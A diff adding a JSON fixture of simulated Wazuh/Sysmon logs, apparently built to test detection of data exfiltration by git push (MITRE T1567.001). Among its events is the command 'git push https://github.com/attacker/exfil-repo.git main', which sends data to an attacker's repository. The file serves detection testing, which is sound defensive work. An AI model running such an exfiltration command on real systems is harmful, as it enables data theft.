@@ -1,0 +1,212 @@
+{
+  "_metadata": {
+    "attack_id": "T1567.001",
+    "variation": "001",
+    "name": "Exfiltration to Code Repository - Git Push",
+    "description": "Exfiltrate data by pushing to private GitHub repository",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 1 - git init",
+      "sequence": 1,
+      "timestamp": "2026-02-10T18:06:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:06:00.000+0000",
+        "rule": {
+          "level": 5,
+          "description": "Sysmon - Event 1: Process Creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1567.001"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration to Code Repository"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707588360.000001",
+        "decoder": {
+          "name": "linux_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 18:06:00.000",
+            "processGuid": "{12345678-1234-65c7-0036-000000000400}",
+            "processId": "15234",
+            "image": "/usr/bin/git",
+            "commandLine": "git init /tmp/exfil-repo",
+            "currentDirectory": "/tmp",
+            "user": "admin2",
+            "hashes": "SHA256=D4E5F678901234567890123456789012345DEF123456789012345DEF123456789",
+            "parentProcessGuid": "{12345678-1234-65c7-0000-000000000400}",
+            "parentProcessId": "15200",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.001",
+        "fomorian_technique_name": "Exfiltration to Code Repository - Git Push"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - git push",
+      "sequence": 2,
+      "timestamp": "2026-02-10T18:06:15.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:06:15.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Git Push to Remote Repository",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1567.001"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration to Code Repository"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707588375.000001",
+        "decoder": {
+          "name": "linux_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 18:06:15.000",
+            "processGuid": "{12345678-1234-65c7-0037-000000000400}",
+            "processId": "15245",
+            "image": "/usr/bin/git",
+            "commandLine": "git push https://github.com/attacker/exfil-repo.git main",
+            "currentDirectory": "/tmp/exfil-repo",
+            "user": "admin2",
+            "hashes": "SHA256=D4E5F678901234567890123456789012345DEF123456789012345DEF123456789",
+            "parentProcessGuid": "{12345678-1234-65c7-0000-000000000400}",
+            "parentProcessId": "15200",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.001",
+        "fomorian_technique_name": "Exfiltration to Code Repository - Git Push"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 3 - HTTPS to github.com",
+      "sequence": 3,
+      "timestamp": "2026-02-10T18:06:16.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:06:16.000+0000",
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 3: Network Connection to GitHub",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1567.001"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration to Code Repository"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "GW01",
+          "ip": "198.51.100.1"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707588376.000001",
+        "decoder": {
+          "name": "linux_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-10 18:06:16.000",
+            "processGuid": "{12345678-1234-65c7-0037-000000000400}",
+            "processId": "15245",
+            "image": "/usr/bin/git",
+            "user": "admin2",
+            "protocol": "tcp",
+            "initiated": "true",
+            "sourceIsIpv6": "false",
+            "sourceIp": "198.51.100.1",
+            "sourceHostname": "GW01.corp.local",
+            "sourcePort": "48932",
+            "destinationIsIpv6": "false",
+            "destinationIp": "140.82.121.4",
+            "destinationHostname": "github.com",
+            "destinationPort": "443"
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1567.001",
+        "fomorian_technique_name": "Exfiltration to Code Repository - Git Push"
+      }
+    }
+  ]
+}
